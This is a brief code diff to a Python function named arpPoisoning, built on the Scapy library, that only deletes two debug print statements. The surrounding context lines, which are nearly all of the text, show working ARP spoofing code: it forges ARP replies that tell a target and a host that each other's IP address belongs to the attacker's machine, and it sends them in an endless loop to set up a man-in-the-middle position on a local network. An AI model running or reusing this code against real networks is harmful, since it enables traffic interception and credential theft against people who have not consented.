@@ -14,9 +14,6 @@ def arpPoisoning(target_ip, host_ip):
         pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
         pkt_host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
 
-        print(pkt_target.show())
-        print(pkt_target)
-
         while True:
             sendp(pkt_target, verbose=False)
             sendp(pkt_host, verbose=False)
